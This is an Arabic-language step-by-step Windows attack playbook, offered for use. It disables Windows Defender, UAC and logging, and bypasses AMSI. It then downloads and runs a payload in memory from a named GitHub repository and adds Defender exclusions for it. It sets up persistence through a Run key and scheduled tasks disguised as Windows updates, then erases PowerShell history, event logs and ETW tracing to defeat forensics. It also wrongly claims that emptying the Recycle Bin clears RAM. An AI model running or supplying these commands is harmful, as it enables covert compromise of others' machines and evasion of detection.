				===   صلاحيات ===




🟢 الطريقة 1: عبر "Run" (Win + R)

1 . اضغط على Win + R لفتح نافذة "Run".
2 . اكتب:
				powershell
3 . اضغط Ctrl + Shift + Enter بدلًا من الضغط على "OK" → هذا يفتح PowerShell كمسؤول مباشرةً.
✅ مباشرةً إلى PowerShell بصلاحيات المسؤول!


🟡 الطريقة 2: عبر البحث في قائمة Start

1 . اضغط على Win لفتح قائمة "Start".
2 . اكتب:
				powershell
3. انقر بزر الفأرة الأيمن على Windows PowerShell.





				===   تعطيل الحماية ===




1️⃣ تعطيله مؤقتًا باستخدام PowerShell
	Set-MpPreference -DisableRealtimeMonitoring $true
✅ هذا يعطله مؤقتًا، لكنه قد يعود إلى التشغيل بعد إعادة تشغيل النظام.


2️⃣ تعطيله بالكامل عبر Group Policy (GPO)
	New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
✅ هذا يعطله بشكل دائم حتى يتم إعادة تفعيله يدويًا!


3️⃣ إيقاف خدمة Windows Defender نهائيًا
sc stop WinDefend
sc config WinDefend start= disabled
✅ هذا يمنع تشغيل Windows Defender حتى بعد إعادة التشغيل.


4️⃣ حذف Windows Defender نهائيًا من النظام (خطير!)
	Uninstall-WindowsFeature -Name Windows-Defender-Features -Remove
🚨 تحذير: هذه الخطوة تحذف Defender تمامًا ولا يمكن استعادته بسهولة.


✅ لجعل الهجوم أقوى:
تعطيل UAC لتجنب النوافذ التحذيرية:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

إيقاف Windows Event Logging حتى لا يتم تسجيل الأنشطة:
wevtutil cl System
wevtutil cl Security




					===   الهجوم ===




1️⃣ تجاوز AMSI و Windows Defender عند تشغيل البايلود
لدا Windows Defender يقوم بفحص AMSIScanBuffer لمنع تشغيل سكريبتات PowerShell الضارة، لذا نحتاج إلى تعطيله مؤقتًا:
📌 تجاوز AMSI مباشرة في PowerShell.
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
✅ هذه الخطوة تمنع AMSI من فحص أي سكريبتات يتم تشغيلها بعد هذا السطر.


2️⃣ تحميل البايلود مباشرة من GitHub وتشغيله من الذاكرة
لنحمل وننفذ سكريبت system.ps1 الموجود في الرابط الذي قدمته دون حفظه على القرص:
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anaslabrini/anasans005/main/system.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anaslabrini/anasans005/main/system.exe')
✅ سيقوم هذا الأمر بتنزيل وتشغيل system.ps1 مباشرة دون ترك أي أثر على القرص.
✅ سيقوم هذا الأمر بتنزيل وتشغيل system.exe مباشرة دون ترك أي أثر على القرص.


3️⃣ إضافة استثناءات في Windows Defender لمنع حذف البايلود
قبل تنفيذ الخطوة التالية، يجب التأكد من أن Windows Defender لن يحذف الملفات:
powershell -ep Bypass -c "Add-MpPreference -ExclusionPath '$env:APPDATA\system.exe'"
powershell -ep Bypass -c "Add-MpPreference -ExclusionPath '$env:APPDATA\system.ps1'"
✅ سيمنع هذا Windows Defender من فحص هذه الملفات في المستقبل.


4️⃣ إنشاء استمرارية للبايلود بعد إعادة التشغيل
حتى لو تم إيقاف تشغيل الجهاز أو إعادة تشغيله، نريد أن يعمل البايلود تلقائيًا.

📌 الطريقة 1: إضافة سكريبت للـ Registry ليعمل عند كل تشغيل
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Update" /t REG_SZ /d "powershell -ep Bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anaslabrini/anasans005/main/system.ps1')" /f
✅ هذا سيضمن أن السكريبت system.ps1 سيتم تشغيله تلقائيًا عند كل تشغيل للنظام.

📌 الطريقة 2: إنشاء Scheduled Task لتشغيل البايلود كل دقيقة
schtasks /create /tn "Windows Security Update" /tr "powershell -ep Bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anaslabrini/anasans005/main/system.ps1')" /sc minute /mo 1 /ru System /f
✅ هذا سيضمن تشغيل البايلود تلقائيًا كل دقيقة حتى لو تم حذف مفتاح الـ Registry.

			
			
			
			===  حدف الاثر ===


🔴 2️⃣ حذف الأوامر من سجل PowerShell (History)
كل أوامر PowerShell التي نفذتها مسجلة في ملف history، لذا يجب مسحه:
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Clear-History
✅ الآن لن يستطيع أي شخص معرفة الأوامر التي نفذتها.


🔴 3️⃣ حذف سجلات Windows (Event Logs)
📌 ويندوز يسجل كل شيء في Event Logs، لذا يجب مسحها نهائيًا:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
✅ هذا يحذف جميع السجلات الأمنية، مما يجعل من الصعب تعقب النشاط المشبوه.


🔴 7️⃣ تعطيل تسجيل الأحداث (ETW) لمنع المراقبة
لدا 📌 Windows يستخدم Event Tracing for Windows (ETW) لتسجيل النشاط المشبوه، لذلك يمكنك تعطيله:
logman stop "Windows PowerShell" -ets
logman stop "Microsoft-Windows-PowerShell/Operational" -ets
✅ الآن لن يتم تسجيل أي نشاط في PowerShell، مما يصعّب عملية التحليل الجنائي.


🔴 8️⃣ مسح ذاكرة الوصول العشوائي (RAM) لمنع التحليل المباشر
📌 إذا كنت تستخدم أدوات مثل Mimikatz أو Meterpreter، فمن الأفضل مسح الـ RAM لمنع اكتشاف أي بيانات مخزنة فيها:
Clear-RecycleBin -Force
✅ لحذف البيانات العالقة في الذاكرة، يمكنك أيضًا إعادة تشغيل الجهاز.

